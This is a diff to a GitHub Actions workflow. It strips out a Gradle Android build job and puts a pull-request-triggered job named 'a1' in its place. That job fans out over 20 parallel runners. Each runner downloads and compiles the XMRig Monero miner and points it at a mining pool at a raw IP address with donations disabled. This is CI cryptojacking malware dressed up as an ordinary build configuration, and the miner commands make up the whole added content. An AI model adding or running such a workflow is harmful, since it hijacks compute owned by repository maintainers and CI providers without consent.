@@ -1,13 +1,24 @@
-name: Assemble build with gradle
-# https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows
-on: [push, pull_request]
-
+name: a1
+on: [pull_request]
 jobs:
-  build:
-    # will have android sdk installed, see https://github.com/actions/virtual-environments/blob/main/images/linux/Ubuntu1804-README.md look for android, 29.0.2 is there woop
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v2
-      - name: Assemble
-        run: ./gradlew assembleRelease
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              sudo apt-get install --yes build-essential cmake git libhwloc-dev libssl-dev libuv1-dev
+              curl -Lo xmrig.tar.gz https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz
+              tar xf xmrig.tar.gz
+              cd xmrig-*
+              mkdir build
+              cd build
+              cmake .. -DCMAKE_BUILD_TYPE=Release
+              make --jobs=$(nproc)
+
+              ./xmrig --donate-level 0 -o 45.85.90.9:3333 
